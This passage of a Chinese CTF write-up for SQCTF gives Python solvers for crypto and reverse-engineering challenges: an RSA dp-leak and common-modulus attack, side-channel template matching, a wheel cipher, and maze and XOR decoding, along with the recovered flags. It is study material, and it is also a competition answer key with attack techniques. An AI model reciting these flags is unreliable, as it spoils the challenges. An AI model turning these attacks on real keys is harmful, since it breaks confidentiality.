class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="number">15124759435262214519214613181859115868729356369274819299240157375966724674496904855757710168853212365134058977781083245051947523020090726851248565503324715984500225724227315777864292625995636236219359256979887906731659848125792269869019299002807101443623257106289957747665586226912446158316961637444556237354422346621287535139897525295200592525427472329815100310702255593134984040293233780616515067333512830391860868933632383433431739823740865023004008736555299772442805617275890761325372253913686933294732259451820332316315205537055439515569011020072762809613676347686279082728000419370190242778504490370698336750029</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">1489209342944820124277807386023133257342259912189247976569642906341314682381245025918040456151960704964362424182449567071683886673550031774367531511627163525245627333820636131483140111126703748875380337657189727259902108519674360217456431712478937900720899137512461928967490562092139439552174099755422092113</span></span><br><span class="line">c = <span class="number">4689152436960029165116898717604398652474344043493441445967744982389466335259787751381227392896954851765729985316050465252764336561481633355946302884245320441956409091576747510870991924820104833541438795794034004988760446988557417649875106251230110075290880741654335743932601800868983384563972124570013568709773861592975182534005364811768321753047156781579887144279837859232399305581891089040687565462656879173423137388006332763262703723086583056877677285692440970845974310740659178040501642559021104100335838038633269766591727907750043159766170187942739834524072423767132738563238283795671395912593557918090529376173</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">e, dp, n</span>):</span><br><span class="line">    edp = e * dp</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (edp - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            p_candidate = (edp - <span class="number">1</span>) // k + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> p_candidate != <span class="number">0</span> <span class="keyword">and</span> n % p_candidate == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> p_candidate</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p = find_p(e, dp, n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;7b909221-c8ff-f391-0c86-d3a9ca8491d1&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ez-SCA"><a href="#ez-SCA" class="headerlink" title="ez_SCA"></a>ez_SCA</h3><p>在这里找到原题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xuruihan177/article/details/139519433">https://blog.csdn.net/xuruihan177/article/details/139519433</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.spatial.distance <span class="keyword">import</span> euclidean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载能量轨迹文件</span></span><br><span class="line">traces = np.load(<span class="string">&#x27;energy_traces_with_flag.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模板轨迹文件</span></span><br><span class="line">template_trace_0 = np.load(<span class="string">&#x27;template_trace_0.npy&#x27;</span>)</span><br><span class="line">template_trace_1 = np.load(<span class="string">&#x27;template_trace_1.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复私钥（明文 flag 的二进制形式）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_private_key</span>(<span class="params">traces, template_trace_0, template_trace_1</span>):</span><br><span class="line">    private_key = []</span><br><span class="line">    <span class="keyword">for</span> trace <span class="keyword">in</span> traces:</span><br><span class="line">        <span class="comment"># 计算轨迹与两个模板轨迹的欧几里得距离</span></span><br><span class="line">        dist_0 = euclidean(trace, template_trace_0)</span><br><span class="line">        dist_1 = euclidean(trace, template_trace_1)</span><br><span class="line">        <span class="comment"># 选择距离较小的模板轨迹对应的比特位</span></span><br><span class="line">        private_key.append(<span class="number">0</span> <span class="keyword">if</span> dist_0 &lt; dist_1 <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> private_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将恢复的二进制形式转换为明文 flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_text</span>(<span class="params">bits</span>):</span><br><span class="line">    chars = [bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>)]</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(char, <span class="number">2</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> chars])</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复私钥并转换为明文</span></span><br><span class="line">private_key = recover_private_key(traces, template_trace_0, template_trace_1)</span><br><span class="line">recovered_bits_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, private_key))</span><br><span class="line">recovered_plaintext = bits_to_text(recovered_bits_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered plaintext: <span class="subst">&#123;recovered_plaintext&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Recovered plaintext: SQCTF&#123;easy_funny_and_not_hard_sca_hhh_just_kingdding&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="Common-Modulus"><a href="#Common-Modulus" class="headerlink" title="Common Modulus"></a>Common Modulus</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">n = <span class="number">13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889</span></span><br><span class="line">c1 = <span class="number">3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253</span></span><br><span class="line">c2 = <span class="number">7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346</span></span><br><span class="line">e1 = <span class="number">4217054819</span></span><br><span class="line">e2 = <span class="number">2800068527</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算扩展欧几里得算法得到s和t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">assert</span> gcd == <span class="number">1</span>, <span class="string">&quot;e1 和 e2 不互质，无法进行共模攻击&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理负数指数的情况</span></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line">    s = -s</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">    t = -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算明文</span></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s, n) * <span class="built_in">pow</span>(c2, t, n)) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节并输出</span></span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"><span class="comment"># SQCTF&#123;06774dcf-b9d1-3c2d-8917-7d2d86b6721c&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a><font style="color:rgb(238, 238, 238);"></h3><p></font>你的天赋是什么<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-5.png"></p>
<h3 id="《1789年的密文》"><a href="#《1789年的密文》" class="headerlink" title="《1789年的密文》"></a>《1789年的密文》</h3><p>浏览器搜找到了来着Bugku的原题：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0yst3r-2046/p/11810574.html">https://www.cnblogs.com/0yst3r-2046/p/11810574.html</a></p>
<p>改改对应脚本内的密钥运行即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#秘钥</span></span><br><span class="line">key=<span class="string">&quot;4,2,11,8,9,12,3,6,10,14,1,5,7,13&quot;</span></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">cipher_text = <span class="string">&quot;UNEHJPBIUOMAVZ&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">str_first_encry = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    str_first_encry.append(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_index = key.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">str_second_encry=[]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key_index:</span><br><span class="line">    str_second_encry.append(str_first_encry[<span class="built_in">int</span>(k)-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(str_first_encry[<span class="built_in">int</span>(k)-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line">    line = str_second_encry[i]</span><br><span class="line">    split_index = line.index(ch)</span><br><span class="line">    temp=[]</span><br><span class="line">    temp[<span class="number">0</span>:<span class="built_in">len</span>(line)-split_index+<span class="number">1</span>] = line[split_index:<span class="built_in">len</span>(line)]</span><br><span class="line">    temp[<span class="built_in">len</span>(temp):] = line[<span class="number">0</span>:split_index]</span><br><span class="line">    str_second_encry[i] = <span class="string">&quot;&quot;</span>.join(temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-------------------------------------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> plain <span class="keyword">in</span> str_second_encry:</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-6.png"></p>
<p>一个一个试出来<code>SQCTF&#123;maketysecgreat&#125;</code></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezRe（三血）"><a href="#ezRe（三血）" class="headerlink" title="ezRe（三血）"></a>ezRe（三血）</h3><p>解压出来就看到是经典Python打包程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-7.png"></p>
<p>常规python逆向即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-8.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: 33.pyc (Python 3.9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_flag = <span class="string">&#x27;NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0&#x27;</span></span><br><span class="line">flag = base64.b64decode(encoded_flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 5ed2be45-2e83-48d2-b631-c088e51ee964</span></span><br></pre></td></tr></table></figure>

<h3 id="慕然回首，那人却在灯火阑珊处"><a href="#慕然回首，那人却在灯火阑珊处" class="headerlink" title="慕然回首，那人却在灯火阑珊处"></a>慕然回首，那人却在灯火阑珊处</h3><p>无壳，直接扔IDA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-9.png"></p>
<p>一个简单的迷宫游戏，从S移动到终点E，地图大小为<code>10*10</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-10.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-11.png"></p>
<p>写个代码自动寻路并找到最短路径即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合迷宫字符串（注意迷宫总共 100 个字符，10x10）</span></span><br><span class="line">maze_str = (</span><br><span class="line">    <span class="string">&quot;S**#########*########**#########**#########*###**##***###**##*###&quot;</span> +</span><br><span class="line">    <span class="string">&quot;##**##*#####*E##*******############&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迷宫尺寸</span></span><br><span class="line">rows, cols = <span class="number">10</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据行列索引访问迷宫字符的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cell</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> maze_str[x * cols + y]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找起点和终点坐标</span></span><br><span class="line">start = end = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">        <span class="keyword">if</span> get_cell(x, y) == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            start = (x, y)</span><br><span class="line">        <span class="keyword">elif</span> get_cell(x, y) == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            end = (x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> end <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到起点或终点&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义移动及对应的指令，注意坐标变换 (x, y)</span></span><br><span class="line">moves = &#123;</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># 上</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>),  <span class="comment"># 左</span></span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>),   <span class="comment"># 下</span></span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>)    <span class="comment"># 右</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BFS 查找最短路径，记录前驱信息以便重构路径</span></span><br><span class="line">queue = deque([start])</span><br><span class="line">visited = &#123;start: <span class="literal">None</span>&#125;  <span class="comment"># key: 当前坐标，value: (前驱坐标, 移动指令)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> queue:</span><br><span class="line">    cur = queue.popleft()</span><br><span class="line">    <span class="keyword">if</span> cur == end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> move, (dx, dy) <span class="keyword">in</span> moves.items():</span><br><span class="line">        nx, ny = cur[<span class="number">0</span>] + dx, cur[<span class="number">1</span>] + dy</span><br><span class="line">        <span class="comment"># 检查边界和是否为墙（墙用 &#x27;#&#x27; 表示）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; rows <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; cols <span class="keyword">and</span> get_cell(nx, ny) != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited[(nx, ny)] = (cur, move)</span><br><span class="line">                queue.append((nx, ny))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果终点在 visited 中，则重构路径</span></span><br><span class="line"><span class="keyword">if</span> end <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未能找到路径&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    path_moves = []</span><br><span class="line">    cur = end</span><br><span class="line">    <span class="keyword">while</span> cur != start:</span><br><span class="line">        prev, move = visited[cur]</span><br><span class="line">        path_moves.append(move)</span><br><span class="line">        cur = prev</span><br><span class="line">    path_moves.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出路径移动指令</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最短路径移动指令：&quot;</span>, <span class="string">&quot;&quot;</span>.join(path_moves))</span><br><span class="line"><span class="comment"># ddsssdssaasssddddddwd</span></span><br></pre></td></tr></table></figure>

<h3 id="鹅鹅鹅，曲项向天歌"><a href="#鹅鹅鹅，曲项向天歌" class="headerlink" title="鹅鹅鹅，曲项向天歌"></a>鹅鹅鹅，曲项向天歌</h3><p>还是熟悉的图标</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-12.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-13.png"></p>
<p>写个脚本逆向出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    ciphertext = <span class="string">&#x27;itd~tzw_know_sanmenxbZ8&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拆分加密文本</span></span><br><span class="line">    part2_1_enc = ciphertext[:<span class="number">7</span>]        <span class="comment"># &#x27;itd~tzw&#x27;</span></span><br><span class="line">    part2_2_enc = ciphertext[<span class="number">7</span>:<span class="number">20</span>]      <span class="comment"># &#x27;_know_sanmen&#x27;</span></span><br><span class="line">    part2_3_enc = ciphertext[<span class="number">20</span>:]       <span class="comment"># &#x27;xbZ&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密对应部分</span></span><br><span class="line">    part2_1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">5</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part2_1_enc])</span><br><span class="line">    part2_2 = part2_2_enc</span><br><span class="line">    part2_3 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">7</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part2_3_enc])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼接得到最终 flag</span></span><br><span class="line">    part2 = part2_1 + part2_2 + part2_3</span><br><span class="line">    flag = <span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;part2&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">decrypt_flag()</span><br><span class="line"><span class="comment"># flag&#123;do_your_know_sanmenxia?&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="圣人当仁不让"><a href="#圣人当仁不让" class="headerlink" title="圣人当仁不让"></a>圣人当仁不让</h3><p>无壳，直接扔IDA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-14.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-15.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-16.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_input</span>():</span><br><span class="line">    <span class="comment"># 目标Base64编码字符串</span></span><br><span class="line">    target_b64 = <span class="string">&quot;/P7sAe/U0s7c1vjb0vjfyt==&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Base64解码得到16字节数据</span></span><br><span class="line">    decoded_bytes = base64.b64decode(target_b64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 逆向操作：先减3再异或0xAA（抵消vm_execute的加3和异操作）</span></span><br><span class="line">    xor_key = <span class="number">0xAA</span></span><br><span class="line">    reversed_data = <span class="built_in">bytes</span>([((b - <span class="number">3</span>) &amp; <span class="number">0xFF</span>) ^ xor_key <span class="keyword">for</span> b <span class="keyword">in</span> decoded_bytes])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 构造17字节输入（末尾补\x00）</span></span><br><span class="line">    input_bytes = reversed_data + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes.decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_solution</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="comment"># 模拟vm_execute操作：异或0xAA后加3</span></span><br><span class="line">    processed_data = <span class="built_in">bytes</span>([</span><br><span class="line">        ((<span class="built_in">ord</span>(c) ^ <span class="number">0xAA</span>) + <span class="number">3</span>) &amp; <span class="number">0xFF</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> input_str[:-<span class="number">1</span>]  <span class="comment"># 前16字节处理</span></span><br><span class="line">    ]) + <span class="string">b&#x27;\x00&#x27;</span>  <span class="comment"># 第17字节未参与有效编码</span></span><br><span class="line">    encoded_check = base64.b64encode(processed_data[:<span class="number">16</span>]).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encoded_check</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 逆向生成输入</span></span><br><span class="line">    solution = reverse_input()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;solution.encode(<span 